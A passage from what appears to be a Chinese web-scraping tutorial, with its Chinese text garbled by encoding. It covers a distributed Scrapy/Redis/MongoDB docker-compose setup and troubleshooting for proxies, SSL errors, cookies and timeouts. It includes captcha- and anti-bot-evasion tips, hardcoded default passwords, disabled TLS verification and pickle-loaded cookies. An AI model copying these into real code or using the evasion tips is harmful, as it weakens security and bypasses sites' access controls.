    image: mongo:7.0
    container_name: crawler_mongodb
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: admin123
    ports:
      - &quot;27017:27017&quot;
    volumes:
      - mongodb_data:/data/db
    networks:
      - crawler_network

  # Scrapy Master (è°ƒåº¦å™¨)
  master:
    build:
      context: ..
      dockerfile: docker/Dockerfile.scheduler
    container_name: crawler_master
    environment:
      REDIS_HOST: redis
      REDIS_PORT: 6379
      REDIS_PASSWORD: redis123
      MONGODB_URI: mongodb://admin:admin123@mongodb:27017/
    depends_on:
      - redis
      - mongodb
    networks:
      - crawler_network
    command: python scheduler/task_manager.py

  # Scrapy Worker (çˆ¬è™«èŠ‚ç‚¹)
  spider:
    build:
      context: ..
      dockerfile: docker/Dockerfile.spider
    environment:
      REDIS_HOST: redis
      REDIS_PORT: 6379
      REDIS_PASSWORD: redis123
      MONGODB_URI: mongodb://admin:admin123@mongodb:27017/
    depends_on:
      - redis
      - mongodb
    networks:
      - crawler_network
    deploy:
      replicas: 3
    command: scrapy crawl target_spider

networks:
  crawler_network:
    driver: bridge

volumes:
  redis_data:
  mongodb_data:
</code></pre>
<h3>11. requirements.txt</h3>
<pre><code class="language-txt">Scrapy&gt;=2.11.0
scrapy-redis&gt;=0.7.3
redis&gt;=5.0.0
pymongo&gt;=4.6.0
python-dotenv&gt;=1.0.0
w3lib&gt;=2.1.0
itemadapter&gt;=0.8.0
</code></pre>
<hr />
<h2>ğŸš€ ä½¿ç”¨æŒ‡å—</h2>
<h3>å•æœºæµ‹è¯•</h3>
<pre><code class="language-bash"># 1. å®‰è£…ä¾èµ–
pip install -r requirements.txt

# 2. å¯åŠ¨ Redis å’Œ MongoDB
docker-compose up -d redis mongodb

# 3. æ·»åŠ ä»»åŠ¡
python scripts/add_tasks.py

# 4. å¯åŠ¨çˆ¬è™«
scrapy crawl target_spider

# 5. ç›‘æ§è¿›åº¦
python scripts/monitor.py
</code></pre>
<h3>åˆ†å¸ƒå¼éƒ¨ç½²</h3>
<pre><code class="language-bash"># 1. æ„å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡
docker-compose up -d

# 2. æ‰©å®¹çˆ¬è™«èŠ‚ç‚¹
docker-compose up -d --scale spider=5

# 3. æŸ¥çœ‹æ—¥å¿—
docker-compose logs -f spider

# 4. æŸ¥çœ‹ç»Ÿè®¡
docker exec crawler_master python scripts/monitor.py
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-69">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></li>
<li><a href="#section-71">Docker éƒ¨ç½²</a></li>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
<li><a href="https://docs.scrapy.org/">Scrapy æ–‡æ¡£</a></li>
<li><a href="https://github.com/rmax/scrapy-redis">scrapy-redis æ–‡æ¡£</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-74">
                                                <h2>[R73] Overview</h2>
                                                <h1>R73: æ•…éšœæ’é™¤ - Troubleshooting</h1>
<p>é‡åˆ°é—®é¢˜ï¼Ÿè¿™é‡Œæœ‰å¸¸è§é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå’Œè°ƒè¯•æŠ€å·§ã€‚</p>
<hr />
<h2>ğŸ” é—®é¢˜åˆ†ç±»</h2>
<h3><a href="#section-75">ğŸŒ ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜</a></h3>
<ul>
<li>è¯·æ±‚è¶…æ—¶</li>
<li>è¿æ¥è¢«æ‹’ç»</li>
<li>SSL è¯ä¹¦é”™è¯¯</li>
<li>ä»£ç†é…ç½®é—®é¢˜</li>
<li>Cookie å¤±æ•ˆ</li>
</ul>
<h3><a href="#section-76">ğŸ”’ åçˆ¬è™«é—®é¢˜</a></h3>
<ul>
<li>IP è¢«å°ç¦</li>
<li>éªŒè¯ç æ‹¦æˆª</li>
<li>User-Agent æ£€æµ‹</li>
<li>JavaScript æŒ‘æˆ˜</li>
<li>é¢‘ç‡é™åˆ¶</li>
</ul>
<h3><a href="#section-77">ğŸ› JavaScript è°ƒè¯•é—®é¢˜</a></h3>
<ul>
<li>æ–­ç‚¹ä¸ç”Ÿæ•ˆ</li>
<li>å˜é‡æŸ¥çœ‹å¤±è´¥</li>
<li>Source Map é”™è¯¯</li>
<li>æ··æ·†ä»£ç è°ƒè¯•</li>
<li>å¼‚æ­¥ä»£ç è·Ÿè¸ª</li>
</ul>
<h3><a href="#section-78">ğŸ”§ å·¥å…·ä½¿ç”¨é—®é¢˜</a></h3>
<ul>
<li>Chrome DevTools é—®é¢˜</li>
<li>Burp Suite é…ç½®</li>
<li>Fiddler ä»£ç†é—®é¢˜</li>
<li>Postman è„šæœ¬é”™è¯¯</li>
<li>Node.js ç¯å¢ƒé—®é¢˜</li>
</ul>
<h3><a href="#section-79">ğŸ’¾ æ•°æ®å¤„ç†é—®é¢˜</a></h3>
<ul>
<li>ç¼–ç é”™è¯¯</li>
<li>JSON è§£æå¤±è´¥</li>
<li>æ•°æ®åº“è¿æ¥é—®é¢˜</li>
<li>æ–‡ä»¶è¯»å†™é”™è¯¯</li>
<li>å†…å­˜æº¢å‡º</li>
</ul>
<h3><a href="#section-80">ğŸ³ Docker éƒ¨ç½²é—®é¢˜</a></h3>
<ul>
<li>å®¹å™¨å¯åŠ¨å¤±è´¥</li>
<li>ç½‘ç»œè¿æ¥é—®é¢˜</li>
<li>å·æŒ‚è½½é”™è¯¯</li>
<li>æƒé™é—®é¢˜</li>
<li>èµ„æºé™åˆ¶</li>
</ul>
<hr />
<h2>ğŸ†˜ å¿«é€ŸæŸ¥æ‰¾</h2>
<h3>æŒ‰é”™è¯¯ä¿¡æ¯æŸ¥æ‰¾</h3>
<table>
<thead>
<tr>
  <th>é”™è¯¯ä¿¡æ¯</th>
  <th>å¯èƒ½åŸå› </th>
  <th>è§£å†³æ–¹æ¡ˆ</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Connection refused</code></td>
  <td>ç›®æ ‡æœåŠ¡å™¨ä¸å¯ç”¨</td>
  <td><a href="#section-75-%E8%BF%9E%E6%8E%A5%E8%A2%AB%E6%8B%92%E7%BB%9D">ç½‘ç»œé—®é¢˜</a></td>
</tr>
<tr>
  <td><code>SSL certificate verify failed</code></td>
  <td>SSL è¯ä¹¦éªŒè¯å¤±è´¥</td>
  <td><a href="#section-75-ssl-%E8%AF%81%E4%B9%A6%E9%94%99%E8%AF%AF">SSL é—®é¢˜</a></td>
</tr>
<tr>
  <td><code>403 Forbidden</code></td>
  <td>è¢«åçˆ¬è™«æ‹¦æˆª</td>
  <td><a href="#section-76-403-forbidden">åçˆ¬é—®é¢˜</a></td>
</tr>
<tr>
  <td><code>429 Too Many Requests</code></td>
  <td>è¯·æ±‚é¢‘ç‡è¿‡é«˜</td>
  <td><a href="#section-76-429-too-many-requests">é¢‘ç‡é™åˆ¶</a></td>
</tr>
<tr>
  <td><code>JSONDecodeError</code></td>
  <td>JSON æ ¼å¼é”™è¯¯</td>
  <td><a href="#section-79-json-%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5">JSON é—®é¢˜</a></td>
</tr>
<tr>
  <td><code>UnicodeDecodeError</code></td>
  <td>ç¼–ç é—®é¢˜</td>
  <td><a href="#section-79-%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF">ç¼–ç é—®é¢˜</a></td>
</tr>
<tr>
  <td><code>TimeoutError</code></td>
  <td>è¯·æ±‚è¶…æ—¶</td>
  <td><a href="#section-75-%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6">è¶…æ—¶é—®é¢˜</a></td>
</tr>
<tr>
  <td><code>ModuleNotFoundError</code></td>
  <td>æ¨¡å—æœªå®‰è£…</td>
  <td><a href="#section-78-python-%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98">ç¯å¢ƒé—®é¢˜</a></td>
</tr>
</tbody>
</table>
<h3>æŒ‰åœºæ™¯æŸ¥æ‰¾</h3>
<ul>
<li><strong>æ— æ³•æŠ“åŒ…</strong>: <a href="#section-78-%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE">ä»£ç†é…ç½®</a></li>
<li><strong>Cookie ä¸ç”Ÿæ•ˆ</strong>: <a href="#section-75-cookie-%E5%A4%B1%E6%95%88">Cookie é—®é¢˜</a></li>
<li><strong>åŠ å¯†æ— æ³•ç ´è§£</strong>: <a href="#section-77">JavaScript è°ƒè¯•</a></li>
<li><strong>çˆ¬è™«è¢«å°</strong>: <a href="#section-76">åçˆ¬è™«å¯¹ç­–</a></li>
<li><strong>æ•°æ®å­˜å‚¨å¤±è´¥</strong>: <a href="#section-79-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E9%97%AE%E9%A2%98">æ•°æ®åº“é—®é¢˜</a></li>
</ul>
<hr />
<h2>ğŸ› ï¸ è°ƒè¯•æŠ€å·§</h2>
<h3>1. ç³»ç»ŸåŒ–æ’æŸ¥</h3>
<pre><code>é—®é¢˜å‡ºç°
   â†“
æŸ¥çœ‹é”™è¯¯æ—¥å¿—
   â†“
ç¡®å®šé—®é¢˜ç±»å‹
   â†“
æŸ¥é˜…ç›¸å…³æ–‡æ¡£
   â†“
å°è¯•è§£å†³æ–¹æ¡ˆ
   â†“
éªŒè¯ä¿®å¤
</code></pre>
<h3>2. æ—¥å¿—æ”¶é›†</h3>
<p><strong>Python ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">import logging

# é…ç½®è¯¦ç»†æ—¥å¿—
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)
logger.debug(&quot;è¯¦ç»†è°ƒè¯•ä¿¡æ¯&quot;)
</code></pre>
<p><strong>Scrapy ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python"># settings.py
LOG_LEVEL = 'DEBUG'
LOG_FILE = 'scrapy_debug.log'
</code></pre>
<h3>3. ç½‘ç»œè¯·æ±‚è°ƒè¯•</h3>
<pre><code class="language-python">import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# é…ç½®é‡è¯•ç­–ç•¥
session = requests.Session()
retry = Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504]
)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)

# è¯¦ç»†æ—¥å¿—
import http.client
http.client.HTTPConnection.debuglevel = 1
</code></pre>
<h3>4. JavaScript è°ƒè¯•</h3>
<pre><code class="language-javascript">// 1. æ·»åŠ æ¡ä»¶æ–­ç‚¹
// å³é”®æ–­ç‚¹ -&gt; Edit breakpoint -&gt; è¾“å…¥æ¡ä»¶
// ä¾‹å¦‚: userId === 123

// 2. ä½¿ç”¨ debugger è¯­å¥
function suspiciousFunction() {
  debugger; // ä»£ç ä¼šåœ¨è¿™é‡Œæš‚åœ
  // ... å¯ç–‘ä»£ç 
}

// 3. ç›‘æ§å˜é‡å˜åŒ–
// Sources -&gt; Watch -&gt; æ·»åŠ è¡¨è¾¾å¼

// 4. æŸ¥çœ‹è°ƒç”¨æ ˆ
// Sources -&gt; Call Stack
</code></pre>
<hr />
<h2>ğŸ“‹ å¸¸è§é—®é¢˜ FAQ</h2>
<h3>Q: ä¸ºä»€ä¹ˆæˆ‘çš„ä»£ç†ä¸ç”Ÿæ•ˆï¼Ÿ</h3>
<p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹:</p>
<ol>
<li>ä»£ç†é…ç½®æ ¼å¼æ˜¯å¦æ­£ç¡®</li>
<li>ä»£ç†æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ</li>
<li>ç³»ç»Ÿä»£ç†è®¾ç½®æ˜¯å¦æ­£ç¡®</li>
<li>æ˜¯å¦éœ€è¦è®¾ç½®ç¯å¢ƒå˜é‡</li>
</ol>
<p>è¯¦è§: <a href="#section-75-%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98">ä»£ç†é…ç½®é—®é¢˜</a></p>
<h3>Q: å¦‚ä½•å¤„ç†éªŒè¯ç ï¼Ÿ</h3>
<p><strong>A</strong>: å¸¸è§æ–¹æ³•:</p>
<ol>
<li>ä½¿ç”¨éªŒè¯ç è¯†åˆ«æœåŠ¡ (2Captcha, æ‰“ç å¹³å°)</li>
<li>è‡ªå»º OCR è¯†åˆ«</li>
<li>ä½¿ç”¨æµè§ˆå™¨è‡ªåŠ¨åŒ–ç»•è¿‡</li>
<li>åˆ†æéªŒè¯ç ç”Ÿæˆé€»è¾‘</li>
</ol>
<p>è¯¦è§: <a href="#section-76-%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8B%A6%E6%88%AA">éªŒè¯ç å¤„ç†</a></p>
<h3>Q: ä¸ºä»€ä¹ˆ Cookie ä¼ è¿‡å»è¿˜æ˜¯å¤±è´¥ï¼Ÿ</h3>
<p><strong>A</strong>: å¯èƒ½åŸå› :</p>
<ol>
<li>Cookie å·²è¿‡æœŸ</li>
<li>ç¼ºå°‘å¿…è¦çš„ Cookie å­—æ®µ</li>
<li>Cookie åŸŸåæˆ–è·¯å¾„ä¸åŒ¹é…</li>
<li>éœ€è¦å…¶ä»–è¯·æ±‚å¤´é…åˆ</li>
</ol>
<p>è¯¦è§: <a href="#section-75-cookie-%E5%A4%B1%E6%95%88">Cookie é—®é¢˜</a></p>
<h3>Q: JavaScript æ··æ·†ä»£ç æ€ä¹ˆè°ƒè¯•ï¼Ÿ</h3>
<p><strong>A</strong>: æŠ€å·§:</p>
<ol>
<li>ä½¿ç”¨ Source Map (å¦‚æœæœ‰)</li>
<li>æ ¼å¼åŒ–ä»£ç  (Beautify)</li>
<li>ä½¿ç”¨ AST å·¥å…·è¿˜åŸ</li>
<li>å•æ­¥è°ƒè¯•è¿½è¸ª</li>
</ol>
<p>è¯¦è§: <a href="#section-77">JavaScript è°ƒè¯•</a></p>
<hr />
<h2>ğŸ’¡ é¢„é˜²æªæ–½</h2>
<h3>ä»£ç è´¨é‡</h3>
<pre><code class="language-python"># 1. å¼‚å¸¸å¤„ç†
try:
    response = requests.get(url, timeout=10)
    response.raise_for_status()
except requests.exceptions.Timeout:
    logger.error(f&quot;Request timeout: {url}&quot;)
except requests.exceptions.HTTPError as e:
    logger.error(f&quot;HTTP error: {e.response.status_code}&quot;)
except Exception as e:
    logger.exception(f&quot;Unexpected error: {e}&quot;)

# 2. å‚æ•°éªŒè¯
def process_data(data):
    if not data:
        raise ValueError(&quot;Data cannot be empty&quot;)
    if not isinstance(data, dict):
        raise TypeError(&quot;Data must be a dictionary&quot;)
    # å¤„ç†æ•°æ®...

# 3. èµ„æºç®¡ç†
with open('file.txt', 'r') as f:
    data = f.read()
    # æ–‡ä»¶è‡ªåŠ¨å…³é—­
</code></pre>
<h3>æ—¥å¿—è®°å½•</h3>
<pre><code class="language-python"># è®°å½•å…³é”®æ“ä½œ
logger.info(f&quot;Processing URL: {url}&quot;)

# è®°å½•é”™è¯¯è¯¦æƒ…
logger.error(f&quot;Failed to parse: {url}&quot;, exc_info=True)

# è®°å½•æ€§èƒ½æŒ‡æ ‡
import time
start = time.time()
# ... æ“ä½œ
logger.info(f&quot;Operation took {time.time() - start:.2f}s&quot;)
</code></pre>
<h3>ç›‘æ§å‘Šè­¦</h3>
<ul>
<li>è®¾ç½®è¯·æ±‚æˆåŠŸç‡ç›‘æ§</li>
<li>é…ç½®é”™è¯¯æ—¥å¿—å‘Šè­¦</li>
<li>ç›‘æ§èµ„æºä½¿ç”¨æƒ…å†µ</li>
<li>å®šæœŸæ£€æŸ¥æ•°æ®è´¨é‡</li>
</ul>
<hr />
<h2>ğŸ”— ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-15">Chrome DevTools æŒ‡å—</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§</a></li>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
<li><a href="#section-83">FAQ</a></li>
</ul>
<hr />
<h2>ğŸ†˜ è·å–å¸®åŠ©</h2>
<p>å¦‚æœä»¥ä¸Šå†…å®¹æ— æ³•è§£å†³æ‚¨çš„é—®é¢˜:</p>
<ol>
<li>æŸ¥çœ‹ <a href="https://github.com/your-repo/issues">GitHub Issues</a></li>
<li>æäº¤æ–°çš„ Issue (é™„å¸¦è¯¦ç»†é”™è¯¯æ—¥å¿—)</li>
<li>åŠ å…¥ç¤¾åŒºè®¨è®º</li>
<li>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£</li>
</ol>
<hr />
<p>è®°ä½ï¼š<strong>è°ƒè¯•æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œè€å¿ƒæ˜¯å…³é”®ï¼</strong> ğŸ¯</p>

                                            </div>
                                            
                                            <div class="section" id="section-75">
                                                <h2>[R74] Network Issues</h2>
                                                <h1>R74: ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜</h1>
<p>å¸¸è§çš„ç½‘ç»œè¿æ¥å’Œ HTTP è¯·æ±‚é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr />
<h2>è¯·æ±‚è¶…æ—¶</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-python">requests.exceptions.Timeout: HTTPConnectionPool(host='example.com', port=80):
Read timed out. (read timeout=10)
</code></pre>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>ç½‘ç»œå»¶è¿Ÿè¿‡é«˜</li>
<li>æœåŠ¡å™¨å“åº”æ…¢</li>
<li>è¶…æ—¶è®¾ç½®è¿‡çŸ­</li>
<li>ä»£ç†è¿æ¥é—®é¢˜</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. å¢åŠ è¶…æ—¶æ—¶é—´</h4>
<pre><code class="language-python">import requests

# è®¾ç½®æ›´é•¿çš„è¶…æ—¶æ—¶é—´ (è¿æ¥è¶…æ—¶, è¯»å–è¶…æ—¶)
response = requests.get(url, timeout=(10, 30))

# æˆ–è€…åªè®¾ç½®æ€»è¶…æ—¶
response = requests.get(url, timeout=60)
</code></pre>
<h4>2. é…ç½®é‡è¯•æœºåˆ¶</h4>
<pre><code class="language-python">from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

session = requests.Session()

# é…ç½®é‡è¯•ç­–ç•¥
retry_strategy = Retry(
    total=3,                    # æ€»é‡è¯•æ¬¡æ•°
    backoff_factor=2,          # é‡è¯•é—´éš”å€æ•°
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=[&quot;HEAD&quot;, &quot;GET&quot;, &quot;OPTIONS&quot;, &quot;POST&quot;]
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount(&quot;http://&quot;, adapter)
session.mount(&quot;https://&quot;, adapter)

# å‘é€è¯·æ±‚
response = session.get(url, timeout=30)
</code></pre>
<h4>3. ä½¿ç”¨å¼‚æ­¥è¯·æ±‚</h4>
<pre><code class="language-python">import asyncio
import aiohttp

async def fetch(session, url):
    try:
        async with session.get(url, timeout=30) as response:
            return await response.text()
    except asyncio.TimeoutError:
        print(f&quot;Timeout: {url}&quot;)
        return None

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
        return results

results = asyncio.run(main())
</code></pre>
<hr />
<h2>è¿æ¥è¢«æ‹’ç»</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-python">requests.exceptions.ConnectionError: HTTPConnectionPool(host='example.com', port=80):
Max retries exceeded with url: / (Caused by NewConnectionError)
</code></pre>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>ç›®æ ‡æœåŠ¡å™¨ä¸å¯ç”¨</li>
<li>ç½‘ç»œä¸é€š</li>
<li>ç«¯å£é”™è¯¯</li>
<li>é˜²ç«å¢™æ‹¦æˆª</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æ£€æŸ¥ç½‘ç»œè¿é€šæ€§</h4>
<pre><code class="language-bash"># æµ‹è¯•è¿æ¥
ping example.com

# æµ‹è¯•ç«¯å£
telnet example.com 80
# æˆ–ä½¿ç”¨ nc
nc -zv example.com 80

# ä½¿ç”¨ curl æµ‹è¯•
curl -I https://example.com
</code></pre>
<h4>2. æ£€æŸ¥ URL æ ¼å¼</h4>
<pre><code class="language-python">from urllib.parse import urlparse

url = &quot;https://example.com:443/path&quot;
parsed = urlparse(url)

print(f&quot;Scheme: {parsed.scheme}&quot;)    # https
print(f&quot;Host: {parsed.netloc}&quot;)      # example.com:443
print(f&quot;Port: {parsed.port}&quot;)        # 443
print(f&quot;Path: {parsed.path}&quot;)        # /path

# ç¡®ä¿ URL æ ¼å¼æ­£ç¡®
if not url.startswith(('http://', 'https://')):
    url = 'https://' + url
</code></pre>
<h4>3. é…ç½®ä»£ç†</h4>
<pre><code class="language-python">proxies = {
    'http': 'http://proxy.com:8080',
    'https': 'http://proxy.com:8080',
}

response = requests.get(url, proxies=proxies)
</code></pre>
<hr />
<h2>SSL è¯ä¹¦é”™è¯¯</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-python">requests.exceptions.SSLError: HTTPSConnectionPool(host='example.com', port=443):
SSL certificate verify failed
</code></pre>
<h3>åŸå› åˆ†æ</h3>
<ol>
<li>æœåŠ¡å™¨è¯ä¹¦è¿‡æœŸ</li>
<li>è¯ä¹¦ä¸è¢«ä¿¡ä»»</li>
<li>è‡ªç­¾åè¯ä¹¦</li>
<li>è¯ä¹¦é“¾ä¸å®Œæ•´</li>
</ol>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ç¦ç”¨ SSL éªŒè¯ (ä»…ç”¨äºæµ‹è¯•)</h4>
<pre><code class="language-python">import requests
import urllib3

# ç¦ç”¨ SSL è­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ç¦ç”¨éªŒè¯
response = requests.get(url, verify=False)
</code></pre>
<h4>2. æŒ‡å®š CA è¯ä¹¦</h4>
<pre><code class="language-python"># ä½¿ç”¨ç³»ç»Ÿè¯ä¹¦
import certifi

response = requests.get(url, verify=certifi.where())

# æˆ–æŒ‡å®šè‡ªå®šä¹‰è¯ä¹¦
response = requests.get(url, verify='/path/to/ca-bundle.crt')
</code></pre>
<h4>3. ä½¿ç”¨è‡ªå®šä¹‰ SSL ä¸Šä¸‹æ–‡</h4>
<pre><code class="language-python">import ssl
import urllib3

# åˆ›å»º SSL ä¸Šä¸‹æ–‡
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# ä½¿ç”¨ urllib3
http = urllib3.PoolManager(
    ssl_context=context,
    cert_reqs='CERT_NONE'
)

response = http.request('GET', url)
</code></pre>
<hr />
<h2>ä»£ç†é…ç½®é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>è¯·æ±‚æ— æ³•é€šè¿‡ä»£ç†</li>
<li>ä»£ç†è®¤è¯å¤±è´¥</li>
<li>HTTPS ä»£ç†ä¸ç”Ÿæ•ˆ</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. HTTP ä»£ç†</h4>
<pre><code class="language-python"># åŸºç¡€ä»£ç†
proxies = {
    'http': 'http://proxy.com:8080',
    'https': 'http://proxy.com:8080',
}

response = requests.get(url, proxies=proxies)
</code></pre>
<h4>2. SOCKS ä»£ç†</h4>
<pre><code class="language-python"># éœ€è¦å®‰è£…: pip install requests[socks]
proxies = {
    'http': 'socks5://127.0.0.1:1080',
    'https': 'socks5://127.0.0.1:1080',
}

response = requests.get(url, proxies=proxies)
</code></pre>
<h4>3. ä»£ç†è®¤è¯</h4>
<pre><code class="language-python"># å¸¦ç”¨æˆ·åå¯†ç çš„ä»£ç†
proxies = {
    'http': 'http://username:password@proxy.com:8080',
    'https': 'http://username:password@proxy.com:8080',
}

response = requests.get(url, proxies=proxies)
</code></pre>
<h4>4. ç¯å¢ƒå˜é‡é…ç½®</h4>
<pre><code class="language-bash"># Linux/Mac
export HTTP_PROXY=&quot;http://proxy.com:8080&quot;
export HTTPS_PROXY=&quot;http://proxy.com:8080&quot;

# Windows
set HTTP_PROXY=http://proxy.com:8080
set HTTPS_PROXY=http://proxy.com:8080
</code></pre>
<pre><code class="language-python"># è‡ªåŠ¨ä½¿ç”¨ç¯å¢ƒå˜é‡ä¸­çš„ä»£ç†
response = requests.get(url)  # ä¼šè‡ªåŠ¨è¯»å– HTTP_PROXY
</code></pre>
<h4>5. éªŒè¯ä»£ç†é…ç½®</h4>
<pre><code class="language-python">import requests

def test_proxy(proxy_url):
    &quot;&quot;&quot;æµ‹è¯•ä»£ç†æ˜¯å¦å¯ç”¨&quot;&quot;&quot;
    proxies = {
        'http': proxy_url,
        'https': proxy_url,
    }

    try:
        response = requests.get(
            'http://httpbin.org/ip',
            proxies=proxies,
            timeout=10
        )
        print(f&quot;âœ… Proxy working: {response.json()}&quot;)
        return True
    except Exception as e:
        print(f&quot;âŒ Proxy failed: {e}&quot;)
        return False

test_proxy('http://127.0.0.1:7890')
</code></pre>
<hr />
<h2>Cookie å¤±æ•ˆ</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>ç™»å½•çŠ¶æ€ä¸¢å¤±</li>
<li>è¯·æ±‚è¢«é‡å®šå‘åˆ°ç™»å½•é¡µ</li>
<li>è¿”å› 401 Unauthorized</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ Session ä¿æŒ Cookie</h4>
<pre><code class="language-python">import requests

# åˆ›å»º Session
session = requests.Session()

# ç™»å½• (Cookie ä¼šè‡ªåŠ¨ä¿å­˜)
session.post('https://example.com/login', data={
    'username': 'user',
    'password': 'pass'
})

# åç»­è¯·æ±‚ä¼šè‡ªåŠ¨å¸¦ä¸Š Cookie
response = session.get('https://example.com/profile')
</code></pre>
<h4>2. æ‰‹åŠ¨ç®¡ç† Cookie</h4>
<pre><code class="language-python"># è·å– Cookie
response = requests.post(login_url, data=credentials)
cookies = response.cookies

# ä½¿ç”¨ Cookie
response = requests.get(url, cookies=cookies)
</code></pre>
<h4>3. ä»æµè§ˆå™¨å¤åˆ¶ Cookie</h4>
<pre><code class="language-python"># æµè§ˆå™¨ä¸­å¤åˆ¶ Cookie å­—ç¬¦ä¸²
cookie_str = &quot;session_id=abc123; user_id=456; token=xyz&quot;

# è½¬æ¢ä¸ºå­—å…¸
cookies = {}
for item in cookie_str.split('; '):
    key, value = item.split('=', 1)
    cookies[key] = value

response = requests.get(url, cookies=cookies)
</code></pre>
<h4>4. æŒä¹…åŒ– Cookie</h4>
<pre><code class="language-python">import pickle

# ä¿å­˜ Cookie
with open('cookies.pkl', 'wb') as f:
    pickle.dump(session.cookies, f)

# åŠ è½½ Cookie
with open('cookies.pkl', 'rb') as f:
    cookies = pickle.load(f)
    session.cookies.update(cookies)
</code></pre>
<h4>5. Cookie è°ƒè¯•</h4>
<pre><code class="language-python">import requests

session = requests.Session()

# æŸ¥çœ‹å½“å‰ Cookie
print(&quot;Current cookies:&quot;)
for cookie in session.cookies:
    print(f&quot;  {cookie.name} = {cookie.value}&quot;)
    print(f&quot;    Domain: {cookie.domain}&quot;)
    print(f&quot;    Path: {cookie.path}&quot;)
    print(f&quot;    Expires: {cookie.expires}&quot;)
</code></pre>
<hr />
<h2>å“åº”ç¼–ç é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<pre><code class="language-python"># ä¹±ç è¾“å‡º
print(response.text)  # è¾“å‡º: ï¿½ï¿½ï¿½ï¿½ï¿½
</code></pre>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. è‡ªåŠ¨æ£€æµ‹ç¼–ç </h4>
<pre><code class="language-python">import requests
from chardet import detect

response = requests.get(url)

# æ£€æµ‹ç¼–ç 
encoding = detect(response.content)['encoding']
response.encoding = encoding

print(response.text)  # æ­£ç¡®æ˜¾ç¤ºä¸­æ–‡
</code></pre>
<h4>2. æ‰‹åŠ¨æŒ‡å®šç¼–ç </h4>
<pre><code class="language-python">response = requests.get(url)

# å¸¸è§ä¸­æ–‡ç¼–ç 
response.encoding = 'utf-8'
# æˆ–
response.encoding = 'gbk'
# æˆ–
response.encoding = 'gb2312'

print(response.text)
</code></pre>
<h4>3. ç›´æ¥ä½¿ç”¨ bytes</h4>
<pre><code class="language-python">response = requests.get(url)

# ä½¿ç”¨ content (bytes) è€Œä¸æ˜¯ text (str)
html = response.content.decode('utf-8', errors='ignore')
</code></pre>
<hr />
<h2>é‡å®šå‘é—®é¢˜</h2>
<h3>é—®é¢˜è¡¨ç°</h3>
<ul>
<li>æ— é™é‡å®šå‘</li>
<li>é‡å®šå‘åä¸¢å¤±å‚æ•°</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. æ§åˆ¶é‡å®šå‘</h4>
<pre><code class="language-python"># ç¦æ­¢è‡ªåŠ¨é‡å®šå‘
response = requests.get(url, allow_redirects=False)
print(f&quot;Status: {response.status_code}&quot;)
print(f&quot;Location: {response.headers.get('Location')}&quot;)

# æ‰‹åŠ¨å¤„ç†é‡å®šå‘
if response.status_code in [301, 302, 303, 307, 308]:
    redirect_url = response.headers['Location']
    response = requests.get(redirect_url)
</code></pre>
<h4>2. æŸ¥çœ‹é‡å®šå‘å†å²</h4>
